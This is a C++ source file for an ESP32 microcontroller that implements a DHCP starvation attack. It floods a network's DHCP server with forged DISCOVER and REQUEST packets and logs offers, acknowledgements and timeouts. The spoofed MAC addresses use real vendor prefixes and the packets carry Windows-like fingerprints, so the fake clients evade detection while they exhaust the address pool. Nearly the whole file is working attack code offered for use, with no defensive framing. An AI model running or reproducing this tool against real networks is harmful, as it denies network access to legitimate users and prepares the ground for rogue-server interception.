#include "DhcpStarvation.h"
#include <WiFi.h>
#include <esp_random.h>

// ── Known OUI prefixes for realistic MACs ───────────────────────────────────

const uint8_t DhcpStarvation::_knownOUI[][3] PROGMEM = {
  {0x00, 0x1A, 0x2B}, // Cisco
  {0x00, 0x1B, 0x63}, // Apple
  {0x00, 0x1C, 0x4D}, // Intel
  {0xAC, 0xDE, 0x48}, // Broadcom
  {0xD8, 0x3C, 0x69}, // Huawei
  {0x3C, 0xA0, 0x67}, // Samsung
  {0xB4, 0x86, 0x55}, // Xiaomi
  {0xF4, 0x28, 0x53}, // TP-Link
  {0x00, 0x25, 0x9C}, // Dell
  {0x00, 0x16, 0xEA}, // LG
  {0x00, 0x1E, 0xC2}, // Sony
  {0x50, 0xCC, 0xF8}, // Microsoft
  {0x00, 0x24, 0xE8}, // ASUS
  {0x88, 0x32, 0x9B}, // HP
  {0x00, 0x26, 0xBB}, // Lenovo
};

const int DhcpStarvation::_ouiCount = sizeof(_knownOUI) / sizeof(_knownOUI[0]);

// ── Public ──────────────────────────────────────────────────────────────────

bool DhcpStarvation::begin()
{
  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("[DhcpStarv] Not connected");
    return false;
  }

  // Save current network config
  _savedIP      = WiFi.localIP();
  _savedGateway = WiFi.gatewayIP();
  _savedSubnet  = WiFi.subnetMask();
  _savedDns     = WiFi.dnsIP();
  _savedSSID    = WiFi.SSID();
  _savedPsk     = WiFi.psk();

  _stats = {};
  _stats.totalIPs = _calcTotalIPs(_savedSubnet);
  if (_stats.totalIPs == 0) _stats.totalIPs = 255;

  _gateway = _savedGateway;
  randomSeed(esp_random());

  Serial.printf("[DhcpStarv] Current IP: %s\n", _savedIP.toString().c_str());
  Serial.printf("[DhcpStarv] Gateway: %s, Subnet: %s, TotalIPs: %lu\n",
    _gateway.toString().c_str(), _savedSubnet.toString().c_str(),
    (unsigned long)_stats.totalIPs);
  Serial.printf("[DhcpStarv] SSID: %s\n", _savedSSID.c_str());

  // Disconnect, set static IP, reconnect — frees port 68
  Serial.println("[DhcpStarv] Disconnecting...");
  WiFi.disconnect(true);
  delay(1000);

  Serial.println("[DhcpStarv] WiFi mode off...");
  WiFi.mode(WIFI_OFF);
  delay(500);
  WiFi.mode(WIFI_STA);
  delay(500);

  Serial.printf("[DhcpStarv] Setting static IP: %s\n", _savedIP.toString().c_str());
  if (!WiFi.config(_savedIP, _savedGateway, _savedSubnet, _savedDns)) {
    Serial.println("[DhcpStarv] Static IP config failed!");
  }
  WiFi.begin(_savedSSID.c_str(), _savedPsk.c_str());

  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
    delay(100);
  }
  if (WiFi.status() != WL_CONNECTED) {
    Serial.printf("[DhcpStarv] Reconnect failed, status: %d\n", WiFi.status());
    return false;
  }

  Serial.printf("[DhcpStarv] Reconnected, IP: %s\n", WiFi.localIP().toString().c_str());

  if (!_udp.begin(68)) {
    Serial.println("[DhcpStarv] UDP port 68 failed");
    return false;
  }

  uint8_t realMac[6];
  WiFi.macAddress(realMac);
  Serial.printf("[DhcpStarv] Real MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
    realMac[0], realMac[1], realMac[2], realMac[3], realMac[4], realMac[5]);

  // Detect DHCP server — send DISCOVER with real MAC first
  Serial.println("[DhcpStarv] Detecting DHCP server...");

  bool detected = false;
  for (int attempt = 0; attempt < 3 && !detected; attempt++) {
    _sendDiscover(realMac);
    Serial.printf("[DhcpStarv] Detection attempt %d/3...\n", attempt + 1);

    unsigned long waitStart = millis();
    while (millis() - waitStart < 5000) {
      int len = _udp.parsePacket();
      if (len > 0) {
        uint8_t buf[1024];
        int readLen = len > 1024 ? 1024 : len;
        _udp.read(buf, readLen);
        Serial.printf("[DhcpStarv] Got packet len=%d\n", len);

        uint8_t msgType = _parseMsgType(buf, readLen);
        Serial.printf("[DhcpStarv] msgType=%d\n", msgType);
        if (msgType == 2) { // OFFER
          IPAddress serverIP(buf[20], buf[21], buf[22], buf[23]);
          if (serverIP.toString() == "0.0.0.0") serverIP = _gateway;
          Serial.printf("[DhcpStarv] DHCP server detected: %s\n", serverIP.toString().c_str());
          detected = true;
          break;
        }
      }
    }
  }

  if (!detected) {
    Serial.println("[DhcpStarv] No DHCP server found! Port 68 may be blocked.");
    Serial.printf("[DhcpStarv] WiFi status: %d, IP: %s\n",
      WiFi.status(), WiFi.localIP().toString().c_str());
  }

  Serial.println("[DhcpStarv] Started");
  _running = true;
  return true;
}

void DhcpStarvation::stop()
{
  if (!_running) return;
  _udp.stop();
  _running = false;
  _phase = IDLE;
  Serial.println("[DhcpStarv] Stopped");
}

void DhcpStarvation::step()
{
  if (!_running || isExhausted()) return;

  switch (_phase) {
    case IDLE:
      _generateRandomMAC(_curMac);
      Serial.printf("[DhcpStarv] DISCOVER #%lu MAC=%02X:%02X:%02X:%02X:%02X:%02X\n",
        (unsigned long)_stats.discover + 1,
        _curMac[0], _curMac[1], _curMac[2], _curMac[3], _curMac[4], _curMac[5]);
      _sendDiscover(_curMac);
      _phase = WAIT_OFFER;
      _phaseStart = millis();
      break;

    case WAIT_OFFER: {
      int len = _udp.parsePacket();
      if (len > 0 && len <= 1024) {
        uint8_t buf[1024];
        _udp.read(buf, len);
        uint8_t msgType = _parseMsgType(buf, len);
        Serial.printf("[DhcpStarv] WAIT_OFFER got pkt len=%d msgType=%d\n", len, msgType);
        if (msgType == 6) {
          _stats.nak++;
          Serial.printf("[DhcpStarv] NAK (total:%lu)\n", (unsigned long)_stats.nak);
          _phase = IDLE;
          break;
        }
        if (msgType == 2) {
          _stats.offer++;
          _consecutiveTimeouts = 0;
          IPAddress offeredIP(buf[16], buf[17], buf[18], buf[19]);
          IPAddress serverIP(buf[20], buf[21], buf[22], buf[23]);
          if (serverIP.toString() == "0.0.0.0") serverIP = _gateway;
          _stats.lastIP = offeredIP;
          Serial.printf("[DhcpStarv] OFFER %s from %s\n",
            offeredIP.toString().c_str(), serverIP.toString().c_str());
          _sendRequest(_curMac, offeredIP, serverIP);
          _phase = WAIT_ACK;
          _phaseStart = millis();
          break;
        }
        Serial.printf("[DhcpStarv] WAIT_OFFER ignoring msgType=%d\n", msgType);
      } else if (len > 1024) {
        Serial.printf("[DhcpStarv] WAIT_OFFER oversized pkt len=%d\n", len);
      }
      if (millis() - _phaseStart >= TIMEOUT_MS) {
        _stats.timeout++;
        _consecutiveTimeouts++;
        Serial.printf("[DhcpStarv] OFFER timeout (consec:%d total:%lu) D:%lu O:%lu A:%lu N:%lu\n",
          _consecutiveTimeouts, (unsigned long)_stats.timeout, (unsigned long)_stats.discover,
          (unsigned long)_stats.offer, (unsigned long)_stats.ack, (unsigned long)_stats.nak);
        _phase = IDLE;
      }
      break;
    }

    case WAIT_ACK: {
      int len = _udp.parsePacket();
      if (len > 0 && len <= 1024) {
        uint8_t buf[1024];
        _udp.read(buf, len);
        uint8_t msgType = _parseMsgType(buf, len);
        Serial.printf("[DhcpStarv] WAIT_ACK got pkt len=%d msgType=%d\n", len, msgType);
        if (msgType == 5) {
          _stats.ack++;
          _consecutiveTimeouts = 0;
          Serial.printf("[DhcpStarv] ACK! (total:%lu/%lu)\n",
            (unsigned long)_stats.ack, (unsigned long)_stats.totalIPs);
          _phase = IDLE;
          break;
        }
        if (msgType == 6) {
          _stats.nak++;
          _consecutiveTimeouts = 0;
          Serial.printf("[DhcpStarv] NAK (total:%lu)\n", (unsigned long)_stats.nak);
          _phase = IDLE;
          break;
        }
        Serial.printf("[DhcpStarv] WAIT_ACK ignoring msgType=%d\n", msgType);
      } else if (len > 1024) {
        Serial.printf("[DhcpStarv] WAIT_ACK oversized pkt len=%d\n", len);
      }
      if (millis() - _phaseStart >= TIMEOUT_MS) {
        _stats.timeout++;
        _consecutiveTimeouts++;
        Serial.printf("[DhcpStarv] ACK timeout (consec:%d total:%lu)\n",
          _consecutiveTimeouts, (unsigned long)_stats.timeout);
        _phase = IDLE;
      }
      break;
    }
  }
}

// ── MAC generation ──────────────────────────────────────────────────────────

void DhcpStarvation::_generateRandomMAC(uint8_t* mac)
{
  int idx = random(0, _ouiCount);
  mac[0] = _knownOUI[idx][0];
  mac[1] = _knownOUI[idx][1];
  mac[2] = _knownOUI[idx][2];
  mac[3] = random(0x00, 0xFF);
  mac[4] = random(0x00, 0xFF);
  mac[5] = random(0x00, 0xFF);
}

// ── DHCP Discover ───────────────────────────────────────────────────────────

void DhcpStarvation::_sendDiscover(uint8_t* mac)
{
  uint8_t pkt[300] = {};
  int i = 0;

  pkt[i++] = 0x01; // BOOTREQUEST
  pkt[i++] = 0x01; // Ethernet
  pkt[i++] = 0x06; // HLEN
  pkt[i++] = 0x00; // HOPS

  // Random XID
  uint32_t xid = esp_random();
  pkt[i++] = (xid >> 24) & 0xFF;
  pkt[i++] = (xid >> 16) & 0xFF;
  pkt[i++] = (xid >> 8)  & 0xFF;
  pkt[i++] =  xid        & 0xFF;

  // Seconds + Flags (broadcast)
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  pkt[i++] = 0x80; pkt[i++] = 0x00;

  // ciaddr, yiaddr, siaddr, giaddr = 0
  i += 16;

  // Client MAC (chaddr, 16 bytes total)
  memcpy(&pkt[i], mac, 6);
  i += 16;

  // sname (64) + file (128)
  i += 192;

  // Magic cookie
  pkt[i++] = 0x63; pkt[i++] = 0x82;
  pkt[i++] = 0x53; pkt[i++] = 0x63;

  // Option 53: DHCP Discover
  pkt[i++] = 53; pkt[i++] = 1; pkt[i++] = 1;

  // Option 61: Client Identifier
  pkt[i++] = 61; pkt[i++] = 7; pkt[i++] = 0x01;
  memcpy(&pkt[i], mac, 6); i += 6;

  // Option 60: Vendor Class Identifier
  static const char* vendorClass = "MSFT 5.0";
  pkt[i++] = 60; pkt[i++] = strlen(vendorClass);
  memcpy(&pkt[i], vendorClass, strlen(vendorClass)); i += strlen(vendorClass);

  // Option 12: Host Name
  static const char* hostName = "DESKTOP-PC";
  pkt[i++] = 12; pkt[i++] = strlen(hostName);
  memcpy(&pkt[i], hostName, strlen(hostName)); i += strlen(hostName);

  // Option 55: Parameter Request List
  pkt[i++] = 55; pkt[i++] = 4;
  pkt[i++] = 1; pkt[i++] = 3; pkt[i++] = 6; pkt[i++] = 15;

  // End
  pkt[i++] = 255;

  _udp.beginPacket(_gateway, 67);
  _udp.write(pkt, i);
  _udp.endPacket();
  _stats.discover++;
}

// ── DHCP Request ────────────────────────────────────────────────────────────

void DhcpStarvation::_sendRequest(uint8_t* mac, IPAddress offeredIP, IPAddress serverIP)
{
  uint8_t pkt[300] = {};
  int i = 0;

  pkt[i++] = 0x01; pkt[i++] = 0x01;
  pkt[i++] = 0x06; pkt[i++] = 0x00;

  uint32_t xid = esp_random();
  pkt[i++] = (xid >> 24) & 0xFF;
  pkt[i++] = (xid >> 16) & 0xFF;
  pkt[i++] = (xid >> 8)  & 0xFF;
  pkt[i++] =  xid        & 0xFF;

  pkt[i++] = 0x00; pkt[i++] = 0x00;
  pkt[i++] = 0x80; pkt[i++] = 0x00;

  i += 16; // ciaddr..giaddr
  memcpy(&pkt[i], mac, 6);
  i += 16; // chaddr
  i += 192; // sname + file

  // Magic cookie
  pkt[i++] = 0x63; pkt[i++] = 0x82;
  pkt[i++] = 0x53; pkt[i++] = 0x63;

  // Option 53: DHCP Request
  pkt[i++] = 53; pkt[i++] = 1; pkt[i++] = 3;

  // Option 50: Requested IP
  pkt[i++] = 50; pkt[i++] = 4;
  pkt[i++] = offeredIP[0]; pkt[i++] = offeredIP[1];
  pkt[i++] = offeredIP[2]; pkt[i++] = offeredIP[3];

  // Option 54: Server Identifier
  pkt[i++] = 54; pkt[i++] = 4;
  pkt[i++] = serverIP[0]; pkt[i++] = serverIP[1];
  pkt[i++] = serverIP[2]; pkt[i++] = serverIP[3];

  // Option 61: Client Identifier
  pkt[i++] = 61; pkt[i++] = 7; pkt[i++] = 0x01;
  memcpy(&pkt[i], mac, 6); i += 6;

  // Option 60: Vendor Class Identifier
  static const char* vendorClass = "MSFT 5.0";
  pkt[i++] = 60; pkt[i++] = strlen(vendorClass);
  memcpy(&pkt[i], vendorClass, strlen(vendorClass)); i += strlen(vendorClass);

  // Option 12: Host Name
  static const char* hostName = "DESKTOP-PC";
  pkt[i++] = 12; pkt[i++] = strlen(hostName);
  memcpy(&pkt[i], hostName, strlen(hostName)); i += strlen(hostName);

  // End
  pkt[i++] = 255;

  _udp.beginPacket(_gateway, 67);
  _udp.write(pkt, i);
  _udp.endPacket();
  _stats.request++;
}

// ── Helpers ─────────────────────────────────────────────────────────────────

uint8_t DhcpStarvation::_parseMsgType(uint8_t* buf, int len)
{
  if (len < 244) return 0;
  if (buf[236] != 0x63 || buf[237] != 0x82 || buf[238] != 0x53 || buf[239] != 0x63) return 0;

  for (int i = 240; i < len - 2;) {
    uint8_t opt = buf[i++];
    if (opt == 255) break;
    if (opt == 0) continue;
    if (i >= len) break;
    uint8_t optLen = buf[i++];
    if (i + optLen > len) break;
    if (opt == 53 && optLen == 1) return buf[i];
    i += optLen;
  }
  return 0;
}

uint32_t DhcpStarvation::_calcTotalIPs(IPAddress subnet)
{
  uint32_t mask = ((uint32_t)subnet[0] << 24) | ((uint32_t)subnet[1] << 16) |
                  ((uint32_t)subnet[2] << 8) | subnet[3];
  uint8_t prefix = 0;
  for (int i = 0; i < 32; i++) {
    if (mask & (1UL << (31 - i))) prefix++;
    else break;
  }
  return 1UL << (32 - prefix);
}
